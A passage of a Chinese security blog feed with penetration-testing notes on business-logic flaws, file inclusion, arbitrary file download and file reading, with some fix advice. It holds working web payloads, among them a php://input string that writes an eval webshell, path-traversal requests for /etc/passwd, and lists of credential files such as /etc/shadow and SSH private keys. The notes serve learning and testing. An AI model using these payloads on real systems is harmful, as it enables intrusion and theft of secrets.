src="/images/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/image-20230603163400180.png" alt="image-20230603163400180" style="zoom: 50%;" /><h3 id="cookie"><a class="markdownIt-Anchor" href="#cookie"></a> cookie</h3><p>验证cookie有误，例如：</p><ol><li>【白盒】仅仅验证是否存在COOKIE且COOKIE中的USER是否有值，有的话就放行。这样是不行的。我只要伪造一个USER，随便输入什么东西就绕过了。</li><li>【黑盒】收到包，看COOKIE中的值是否是可以操作的，就随便改，碰运气</li></ol><h3 id="综合考虑"><a class="markdownIt-Anchor" href="#综合考虑"></a> 综合考虑</h3><ol><li>字典应该如何设置，是结合信息搜集还是用top100字典</li><li>验证码如何绕过，图片or数字验证码</li><li>登录次数限制</li><li>综合考虑多个问题</li></ol><h2 id="数据篡改安全"><a class="markdownIt-Anchor" href="#数据篡改安全"></a> 数据篡改安全</h2><h3 id="物品购买流程"><a class="markdownIt-Anchor" href="#物品购买流程"></a> 物品购买流程</h3><p>订购、确认信息、付款</p><h3 id="常见篡改参数"><a class="markdownIt-Anchor" href="#常见篡改参数"></a> 常见篡改参数</h3><p>商品ID、购买价格/优惠券、订单信息</p><h3 id="常见篡改方法"><a class="markdownIt-Anchor" href="#常见篡改方法"></a> 常见篡改方法</h3><p>替换支付、重复支付、最小额度支付、负数支付、溢出支付、优惠券支付…</p><p><img src="/images/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E.png" alt="支付漏洞" /></p><p><strong>支付接口</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">index.php?s=/wap/pay/wchatQrcodePay //微信支付</span><br><span class="line">index.php?s=/wap/pay/alipay //支付宝支付</span><br><span class="line">index.php?s=http://www.xiaodi8.com/alipay //调用其他的支付接口</span><br><span class="line">payname= pay_name=payname=_GET[‘s’];</span><br></pre></td></tr></table></figure><h1 id="找回机制与接口"><a class="markdownIt-Anchor" href="#找回机制与接口"></a> 找回机制与接口</h1><h2 id="找回机制"><a class="markdownIt-Anchor" href="#找回机制"></a> 找回机制</h2><ul><li><p><strong>客户端回显</strong>：有时候发送邮箱验证码，会通过包来发送，<strong>验证码就藏在发送包的内容</strong>中，甚至是<strong>图片标签里面就有验证码</strong></p></li><li><p><strong>Response 状态值</strong>：有时候验证完验证码后，服务器会发送Res，里面包含一个CODE，表达是否验证成功，这个时候，我们可以通过Burp拦截回显包，修改CODE值，看看时候是正确的。（当然我们得提前知道这个CODE是什么值的时候是正确的）</p><img src="/images/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/image-20230605110748393.png" alt="image-20230605110748393" style="zoom:50%;" /></li><li><p><strong>验证码爆破</strong>：一般4位数数字验证码是可以爆破的</p></li><li><p><strong>找回流程绕过/更改找回流程</strong></p><p>通常发生在邮件/手机的验证码绕过。当发送了包，替换原号码为我们的手机号来收验证码。然后把验证码写上就行。</p><p>还有一种是，邮箱收到找回密码的URL，注意观察这个URL有一些参数值是可以改的，改了它看能不能实现跨用户的密码重置。当然，这会有其他问题出现，例如，如何去改这个参数（这个参数如何构成的）</p></li></ul><h2 id="接口攻击后面会详细"><a class="markdownIt-Anchor" href="#接口攻击后面会详细"></a> 接口攻击（后面会详细）</h2><ol><li>短信轰炸</li><li>来电轰炸</li></ol><h1 id="验证码-token与接口"><a class="markdownIt-Anchor" href="#验证码-token与接口"></a> 验证码、token与接口</h1><h2 id="验证码安全"><a class="markdownIt-Anchor" href="#验证码安全"></a> 验证码安全</h2><ul><li>分类：图片，手机或邮箱，语音，视频，操作等</li><li>原理：验证生成或验证过程中的逻辑问题</li><li>危害：账户权限泄漏，短信轰炸，遍历，任意用户操作等</li><li>漏洞：客户端回显(已讲)，验证码复用，验证码爆破(已讲)，绕过等</li></ul><blockquote><p>验证码识别插件工具使用 captcha-killer，Pkav_Http_Fuzz，reCAPTCHA 等</p></blockquote><h2 id="token-安全"><a class="markdownIt-Anchor" href="#token-安全"></a> token 安全</h2><p>基本上述同理，主要是验证中可存在绕过可继续后续测试 token 爆破，token 客户端回显等</p><blockquote><p>客户端访问服务器, 服务器返回一个签名的token给客户端, 服务器和客户端各自保存token。以后每次请求服务器都会携带token</p></blockquote><p><strong>token的主要作用：</strong></p><ol><li><p>防止表单重复提交</p></li><li><p>身份验证</p></li></ol><h2 id="接口安全"><a class="markdownIt-Anchor" href="#接口安全"></a> 接口安全</h2><p>调用，遍历，未授权，篡改等</p><p><strong>调用案例</strong>：短信轰炸</p><p><strong>遍历案列</strong>：UID 等遍历</p><p><strong>callback 回调 JSONP</strong> （看跨域共享~）</p><p><strong>参数篡改</strong>：墨者靶场</p><h1 id="防御措施"><a class="markdownIt-Anchor" href="#防御措施"></a> 防御措施</h1><ol><li>前后端双重检测</li></ol><h1 id="资源"><a class="markdownIt-Anchor" href="#资源"></a> 资源</h1><h2 id="涉及资源"><a class="markdownIt-Anchor" href="#涉及资源"></a> 涉及资源</h2><ol><li>爆破字典：<a href="https://github.com/huyuanzhi2/password_brute_dictionary">https://github.com/huyuanzhi2/password_brute_dictionary</a></li><li>业务逻辑文章：<a href="https://cloud.tencent.com/developer/article/2091084">https://cloud.tencent.com/developer/article/2091084</a></li></ol><h2 id="漏洞文章图"><a class="markdownIt-Anchor" href="#漏洞文章图"></a> 漏洞文章图</h2><p><img src="/images/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/image-20230603105155068.png" alt="image-20230603105155068" /></p>]]></content>
    
    
      
      
    <summary type="html">&lt;img src=&quot;/images/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/image-20230603112019979.png&quot; alt=&quot;image-20230603112019979&quot; style=&quot;zoom:67%;&quot; /&gt;
&lt;h1 i</summary>
      
    
    
    
    <category term="渗透测试基础" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="业务逻辑" scheme="https://j3f5.github.io/tags/%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91/"/>
    
  </entry>
  
  <entry>
    <title>文件包含与下载读取基础</title>
    <link href="https://j3f5.github.io/articles/2023/06/02/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8E%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%9F%BA%E7%A1%80/"/>
    <id>https://j3f5.github.io/articles/2023/06/02/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8E%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%9F%BA%E7%A1%80/</id>
    <published>2023-06-02T08:00:56.000Z</published>
    <updated>2023-06-02T08:00:56.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文件包含"><a class="markdownIt-Anchor" href="#文件包含"></a> 文件包含</h1><p>即一次包含之后就不用再重新写相关代码，直接调用即可。程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，这样，如果我们能<strong>控制这些参数</strong>，就可以进行文件包含。</p><p>利用：</p><ol><li>有相关的包含函数</li><li>该函数内参数可控</li></ol><p><img src="/images/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8E%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%9F%BA%E7%A1%80/image-20230602220540888.png" alt="image-20230602220540888" /></p><h2 id="常见代码以及脚本函数"><a class="markdownIt-Anchor" href="#常见代码以及脚本函数"></a> 常见代码以及脚本函数</h2><h3 id="造成包含的常见脚本代码"><a class="markdownIt-Anchor" href="#造成包含的常见脚本代码"></a> 造成包含的常见脚本代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#include file=&quot;1.asp&quot; --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--#include file=&quot;top.aspx&quot; --&gt;</span><br><span class="line"></span><br><span class="line">&lt;c:import url=&quot;http://thief.one/1.jsp&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;jsp:include page=&quot;head.jsp&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;%@ include file=&quot;head.jsp&quot;%&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php include(&#x27;test.php&#x27;)?&gt;</span><br></pre></td></tr></table></figure><h3 id="脚本函数"><a class="markdownIt-Anchor" href="#脚本函数"></a> 脚本函数</h3><h4 id="php"><a class="markdownIt-Anchor" href="#php"></a> PHP</h4><ul><li><p>include()：当使用include()函数包含文件时，只有代码执行到include()函数时才将文件包含进来，发生错误时只给出一个警告，继续向下执行。</p></li><li><p>include_once()：include_once 语句在脚本执行期间包含并运行指定文件。此行为和 include 语句类似，唯一区别是如果该文件中已经被包含过，则不会再次包含，且 include_once 会返回 true。</p></li><li><p>include_once()：可以用于在脚本执行期间同一个文件有可能被包含超过一次的情况下，想确保它只被包含一次以避免函数重定义，变量重新赋值等问题</p></li><li><p>require()：当使用require()函数包含文件时，只要程序一执行就会立即调用文件，发生错误的时候会输出错误信息，并且终止脚本的运行。</p></li><li><p>require_once()：require_once表达式和 require 表达式完全相同，唯一区别是 PHP 会检查该文件是否已经被包含过，如果是则不会再次包含。</p></li></ul><h2 id="检测"><a class="markdownIt-Anchor" href="#检测"></a> 检测</h2><p>这里的检测也分白盒黑盒，都差不多老三样</p><ol><li>白盒：代码审计</li><li>黑盒<ol><li>公开漏洞</li><li>漏扫工具</li><li>手工查看参数和功能点</li></ol></li></ol><h2 id="类型与绕过"><a class="markdownIt-Anchor" href="#类型与绕过"></a> 类型与绕过</h2><h3 id="类型"><a class="markdownIt-Anchor" href="#类型"></a> 类型</h3><ol><li>远程包含（RFI）</li><li>本地包含（LFI）</li></ol><h3 id="绕过"><a class="markdownIt-Anchor" href="#绕过"></a> 绕过</h3><h4 id="本地有限制包含"><a class="markdownIt-Anchor" href="#本地有限制包含"></a> 本地有限制包含</h4><ol><li><p><code>%00</code>截断</p><p>条件：magic_quotes_gpc = Off php版本&lt;5.3.4</p></li><li><p>路径长度截断</p><p>条件：windows OS，点号需要长于256；linux OS 长于4096</p><blockquote><p>Windows下目录最大长度为256字节，超出的部分会被丢弃；</p><p>Linux下目录最大长度为4096字节，超出的部分会被丢弃。</p></blockquote></li></ol><p>​<img src="/images/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8E%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%9F%BA%E7%A1%80/image-20230602164350289.png" alt="image-20230602164350289" /></p><ol start="3"><li><p>点号<code>.</code>截断</p><p>条件：windows OS，点号需要长于256</p><p><img src="/images/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8E%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%9F%BA%E7%A1%80/image-20230602164433984.png" alt="image-20230602164433984" /></p></li></ol><h4 id="远程有限制包含"><a class="markdownIt-Anchor" href="#远程有限制包含"></a> 远程有限制包含</h4><p>PHP的配置文件allow_url_fopen和allow_url_include设置为ON，include/require等包含函数可以加载远程文件，如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen = On（是否允许打开远程文件）</span><br><span class="line">allow_url_include = On（是否允许include/require远程文件）</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>.<span class="string">&quot;.html&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这个限制了包含文件的格式。但是可以绕过。</p><ol><li><p>使用<code>?</code>号：<code>www.xxx.com/include.php?filename=myfile.php?</code></p><p>即把后面的当做参数</p></li><li><p>使用<code>#(%23)</code>：<code>www.xxx.com/include.php?filename=myfile.php%23</code></p><p>即把后面的当做HTML标签</p></li><li><p>使用<code> 空格(%20)</code>：<code>www.xxx.com/include.php?filename=myfile.php%20</code></p></li></ol><h2 id="利用"><a class="markdownIt-Anchor" href="#利用"></a> 利用</h2><table><thead><tr><th>-</th><th>php</th><th>java</th><th>curl(ssrf)</th><th>asp</th><th>利用</th></tr></thead><tbody><tr><td>http/https</td><td>√</td><td>√</td><td>√</td><td>√</td><td></td></tr><tr><td>gopher</td><td>√</td><td>before JDK1.7</td><td>before 7.49.0 不支持\x00</td><td>before version 3</td><td></td></tr><tr><td>ftp</td><td>√</td><td>√</td><td>√</td><td>√</td><td></td></tr><tr><td>file</td><td>√</td><td>√</td><td>√</td><td>√</td><td></td></tr><tr><td>dict</td><td>–with-curlwrappers</td><td>×</td><td>√</td><td>×</td><td></td></tr><tr><td>imap/pop3</td><td>–with-curlwrappers</td><td>×</td><td>√</td><td>×</td><td></td></tr><tr><td>rtsp</td><td>–with-curlwrappers</td><td>√</td><td>√</td><td>√</td><td></td></tr><tr><td>smb</td><td>–with-curlwrappers</td><td>√</td><td>√</td><td>√</td><td></td></tr><tr><td>smtp</td><td>–with-curlwrappers</td><td>×</td><td>√</td><td>×</td><td></td></tr><tr><td>telnet</td><td>–with-curlwrappers</td><td>×</td><td>√</td><td>×</td><td></td></tr><tr><td>ssh2</td><td>受限于allow_url_fopen</td><td>×</td><td>×</td><td>×</td><td></td></tr><tr><td>ogg</td><td>受限于allow_url_fopen</td><td>×</td><td>×</td><td>×</td><td></td></tr><tr><td>ldap</td><td>×</td><td>×</td><td>×</td><td>×</td><td></td></tr><tr><td>php</td><td>√</td><td>×</td><td>×</td><td>×</td><td></td></tr><tr><td>zlib/bzip2/zip</td><td>受限于allow_url_fopen</td><td>×</td><td>×</td><td>×</td><td></td></tr></tbody></table><h3 id="php专属伪协议"><a class="markdownIt-Anchor" href="#php专属伪协议"></a> PHP专属伪协议</h3><table><thead><tr><th>协议</th><th>allow_url_fopen</th><th>allow_url_include</th><th>用法</th></tr></thead><tbody><tr><td>file://</td><td>off/on</td><td>off/on</td><td>?file=file:///user/desktop/file.txt</td></tr><tr><td>php://filter</td><td>off/on</td><td>off/on</td><td>?file=php://filter/read=convert.base64-encode/resource=./index.php</td></tr><tr><td>php://input</td><td>off/on</td><td>on</td><td>?file=php://input[POST DATA]  <code>&lt;?php phpinfo()?&gt;</code><br /><img src="/images/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8E%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%9F%BA%E7%A1%80/image-20230602215753944.png" alt="image-20230602215753944" /><br /><strong>注：当enctype=”multipart/form-data”时，php://input是无效的。</strong><br />常用：<code>http://127.0.0.1/include.php?file=php://input&lt;br/&gt;[POST DATA部分]&lt;br/&gt;&lt;?php fputs(fopen('shell.php','w'),'&lt;?php @eval($_GET[cmd]); ?&gt;'); ?&gt;</code></td></tr><tr><td>compress.bzip2://</td><td>off/on</td><td>off/on</td><td>?file=compress.bzip2://D:/soft/phpStudy/WW/file.bz2<br />[or]<br />?file=compress.bzip2://./file.bz2</td></tr><tr><td>compress.zlib://</td><td>off/on</td><td>off/on</td><td>?file=compress.zlib//D:/soft/phpStudy/WWW/filegz<br />[or]<br />?file=compress.zlib://./file.gz</td></tr><tr><td>data://</td><td>on</td><td>on</td><td>?file=data://text/plain,<code>&lt;?php phpinfo()?&gt;</code><br />[or]<br />?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=<br />也可以:<br />?file=data:text/plain,<code>&lt;?php phpinfo0?&gt;</code><br />[or]<br />?file=data:text/plain:base64,PD9waAacGhwaW5mbyapPz4=<br /><img src="/images/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8E%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%9F%BA%E7%A1%80/image-20230602220146924.png" alt="image-20230602220146924" /></td></tr><tr><td>http://</td><td></td><td></td><td><img src="/images/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8E%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%9F%BA%E7%A1%80/image-20230602215928728.png" alt="image-20230602215928728" /></td></tr><tr><td>filter://</td><td></td><td></td><td>php://filter/read=convert.base64-encode/resource=[文件名]<br/><a href="http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php">http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php</a><br /></td></tr><tr><td>phar://</td><td></td><td></td><td>步骤：写一个一句话木马文件shell.php，然后用zip协议压缩为shell.zip，然后将后缀改为png等其他格式。 再用<strong>解压函数phar解压</strong>即可：<code>?file=phar://压缩包/内部文件</code></td></tr><tr><td>zip://</td><td></td><td></td><td>相反，这个是<strong>压缩函数</strong>。用法：<code>?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名] </code>。例如：<code>zip://xxx.png#shell.php</code></td></tr></tbody></table><h4 id="php伪协议"><a class="markdownIt-Anchor" href="#php伪协议"></a> PHP伪协议</h4><p>事实就是支持的协议和封装的协议12种</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">file:// - 访问本地文件系统</span><br><span class="line">http:// - 访问http网站</span><br><span class="line">ftp:// - 访问FTP（s）URLS</span><br><span class="line">php:// - 访问各个输入输出流</span><br><span class="line">zlib:// - 压缩流</span><br><span class="line">data：// - 数据（RFC 2397）</span><br><span class="line">glob：// -查找匹配的文件路径模型</span><br><span class="line">ssh2：// - Secure Shell 2</span><br><span class="line">rar:// - RAR</span><br><span class="line">ogg:// - 音频流</span><br><span class="line">expect:// - 处理交互式的流</span><br></pre></td></tr></table></figure><h4 id="phpini参数设置"><a class="markdownIt-Anchor" href="#phpini参数设置"></a> php.ini参数设置</h4><p>在php.ini里有两个重要的参数allow_url_fopen、allow_url_include。</p><ul><li>allow_url_fopen:默认值是ON。允许url里的封装协议访问文件；</li><li>allow_url_include:默认值是OFF。不允许包含url里的封装协议包含文件；</li></ul><h2 id="修复"><a class="markdownIt-Anchor" href="#修复"></a> 修复</h2><h1 id="文件下载"><a class="markdownIt-Anchor" href="#文件下载"></a> 文件下载</h1><p>注意区别：</p><ol><li>文件被解析：文件包含</li><li>显示源代码：文件读取</li><li>提示文件下载：文件下载</li></ol><h2 id="一般链接形式与攻击思路"><a class="markdownIt-Anchor" href="#一般链接形式与攻击思路"></a> 一般链接形式与攻击思路</h2><ul><li>抓URL，看URL上有什么下载形式的URL</li><li><strong>就是在一些下载按钮那</strong>，然后你改一下下面的链接就可以下载其他文件了。例如提取下载链接：<code>http://..../?s=asdfagqrebvz==</code>是个base64，我们下载一个文件，观察其文件名，然后把后面的Base64解码，看目录，对应着文件名就可以实现任意文件下载了。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">download.php?path=</span><br><span class="line">download.php?file=</span><br><span class="line">down.php?file=</span><br><span class="line">data.php?file=</span><br><span class="line">readfile.php?file=</span><br><span class="line">read.php?filename=</span><br></pre></td></tr></table></figure><h2 id="包含参数"><a class="markdownIt-Anchor" href="#包含参数"></a> 包含参数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&amp;RealPath=</span><br><span class="line">&amp;FilePath=</span><br><span class="line">&amp;ﬁlepath=</span><br><span class="line">&amp;Filepath=</span><br><span class="line">&amp;Path=</span><br><span class="line">&amp;path=</span><br><span class="line">&amp;inputFile=</span><br><span class="line">&amp;Inputfile=</span><br><span class="line">&amp;url=</span><br><span class="line">&amp;urls=</span><br><span class="line">&amp;Lang=</span><br><span class="line">&amp;dis=</span><br><span class="line">&amp;data=</span><br><span class="line">&amp;Data=</span><br><span class="line">&amp;readﬁle=</span><br><span class="line">&amp;ﬁlep=</span><br><span class="line">&amp;src=</span><br><span class="line">&amp;menu=</span><br><span class="line">META-INF</span><br><span class="line">WEB-INF</span><br></pre></td></tr></table></figure><h2 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h2><p>任意文件下载漏洞的利用主要是为了信息收集，我们通过对服务器配置文件的下载，获取到大量的配置信息、源码，从而根据获取的信息来进一步挖掘服务器漏洞从而入侵。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">index.php?f=…/…/…/…/…/…/etc/passwd</span><br><span class="line">index.php?f=…/index.php</span><br><span class="line">index.php?f=ﬁle:///etc/passwd</span><br><span class="line">readfile.php?file=/etc/passwd</span><br></pre></td></tr></table></figure><h2 id="常见文件敏感文件"><a class="markdownIt-Anchor" href="#常见文件敏感文件"></a> 常见文件&amp;敏感文件</h2><ul><li><p>后台首页日志等可见文件（常见）</p></li><li><p><strong>数据库配置文件</strong></p></li><li><p><strong>各种接口文件</strong></p></li><li><p>密钥信息等文件</p></li><li><p>常见的敏感文件路径</p></li></ul><h3 id="windows"><a class="markdownIt-Anchor" href="#windows"></a> Windows</h3><p>C:\boot.ini //查看系统版本</p><p>C:\Windows\System32\inetsrv\MetaBase.xml //IIS配置文件</p><p>C:\Windows\repair\sam //存储系统初次安装的密码</p><p>C:\Program Files\mysql\my.ini //Mysql配置</p><p>C:\Program Files\mysql\data\mysql\user.MYD //Mysql root</p><p>C:\Windows\php.ini //php配置信息</p><p>C:\Windows\my.ini //Mysql配置信息</p><p>C:\Windows\win.ini //Windows系统的一个基本系统配置文件</p><h3 id="linux"><a class="markdownIt-Anchor" href="#linux"></a> Linux</h3><p>/root/.ssh/authorized_keys //如需登录到远程主机，需要到.ssh目录下，新建authorized_keys文件，并将id_rsa.pub内容复制进去</p><p>/root/.ssh/id_rsa //ssh私钥,ssh公钥是id_rsa.pub</p><p>/root/.ssh/id_ras.keystore //记录每个访问计算机用户的公钥</p><p>/root/.ssh/known_hosts //记录每个访问计算机用户的公钥</p><p>/etc/passwd //账户信息</p><p>/etc/shadow //账户密码文件</p><p>/etc/my.cnf //mysql配置文件</p><p>/etc/httpd/conf/httpd.conf //apache配置文件</p><p>/root/.bash_history //用户历史命令记录文件</p><p>/root/.mysql_history //mysql历史命令记录文件</p><p>/proc/mounts //记录系统挂载设备</p><p>/porc/config.gz //内核配置文件</p><p>/var/lib/mlocate/mlocate.db //全文件路径</p><p>/porc/self/cmdline //当前进程的cmdline参数</p><p>/usr/local/app/php5/lib/php.ini //PHP配置文件</p><h2 id="漏洞修复"><a class="markdownIt-Anchor" href="#漏洞修复"></a> 漏洞修复</h2><ol><li>部署WAF产品</li><li><strong>过滤<code>.</code>，使用户在url中不能回溯上级目录</strong></li><li>正则严格<strong>判断用户输入参数的格式</strong></li><li><strong>配置限定文件访问范围</strong>，目录权限设置或单独文件权限设置</li><li>将下载区独立出来，放在项目路径外，给每个下载资源固定的URL，而不是所有的下载资源都是统一的URL：<code>http://www.test.com/download?filename=文件名</code></li><li>净化数据：对用户传过来的文件名参数进行硬编码或统一编码，对文件类型进行白名单控制，对包含恶意字符或者空字符的参数进行拒绝。</li><li>任意文件下载漏洞也有可能是web所采用的中间件的版本低而导致问题的产生，例如ibm的websphere的任意文件下载漏洞，<strong>需更新其中间件的版本</strong>可修复。</li><li>要下载的文件地址保存至数据库中。</li><li>文件路径保存至数据库，让用户提交文件对应ID下载文件。</li><li>用户下载文件之前需要<strong>进行权限判断</strong>。</li><li>文件放在web无法直接访问的目录下。</li><li>不允许提供目录遍历服务。</li><li>公开文件可放置在web应用程序下载目录中通过链接进行下载。</li><li>记录文件下载日志。</li></ol><h1 id="文件读取"><a class="markdownIt-Anchor" href="#文件读取"></a> 文件读取</h1><p>任意文件读取是属于文件操作漏洞的一种，一般任意文件读取漏洞可以读取配置信息甚至系统重要文件。</p><p>漏洞产生原因：</p><ol><li>任意语言代码读取功能函数</li><li>文件读取函数：readfile()、file_get_contents()、fopen()中</li><li>$filename没有经过校验或者校验不合格</li><li>用户可控制变量读取任意文件，如/etc/passwd、./index.php、/config.ini</li></ol><h2 id="漏洞检测"><a class="markdownIt-Anchor" href="#漏洞检测"></a> 漏洞检测</h2><p>手工查看参数值及功能点（资源下载）</p><h2 id="漏洞利用-2"><a class="markdownIt-Anchor" href="#漏洞利用-2"></a> 漏洞利用</h2><p><code>readfile.php?f=../../../../../../etc/passwd</code><br />读取文件：配置文件（数据库，平台，各种敏感文件等）</p><h1 id="实例"><a class="markdownIt-Anchor" href="#实例"></a> 实例</h1><h2 id="java-web目录-roarctf-2019easy-java"><a class="markdownIt-Anchor" href="#java-web目录-roarctf-2019easy-java"></a> java web目录 [RoarCTF 2019]Easy Java</h2><p>一般来说，java web的配置文件必定存在于网页目录：<code>WEB-INF/web.xml</code>，里面有路由以及对应的servlet名等。</p><blockquote><p>Tricks：</p><ol><li>GET下载不了就换成POST。注意：单纯的修改是不行的，需要用Hackbar发送一个POST包才行。</li><li>java WEB-INF/web.xml文件泄露。所有源码文件都在class文件里，组件com.???.???实际上是文件夹com/???/???。</li></ol></blockquote><p><img src="/images/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8E%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%9F%BA%E7%A1%80/image-20230603100636553.png" alt="image-20230603100636553" /></p><h2 id="小米路由cnvd漏洞"><a class="markdownIt-Anchor" href="#小米路由cnvd漏洞"></a> 小米路由CNVD漏洞</h2><p>任意文件读取可以登录后台。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;文件包含&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#文件包含&quot;&gt;&lt;/a&gt; 文件包含&lt;/h1&gt;
&lt;p&gt;即一次包含之后就不用再重新写相关代码，直接调用即可。程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，</summary>
      
    
    
    
    <category term="渗透测试基础" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="文件包含" scheme="https://j3f5.github.io/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
    <category term="文件读取" scheme="https://j3f5.github.io/tags/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
    
  </entry>
  
  <entry>
    <title>RCE基础-代码执行&amp;命令执行</title>
    <link href="https://j3f5.github.io/articles/2023/06/02/RCE%E5%9F%BA%E7%A1%80-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C&amp;%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <id>https://j3f5.github.io/articles/2023/06/02/RCE%E5%9F%BA%E7%A1%80-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C&amp;%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</id>
    <published>2023-06-02T00:56:20.000Z</published>
    <updated>2023-06-02T00:56:17.000Z</updated>
    
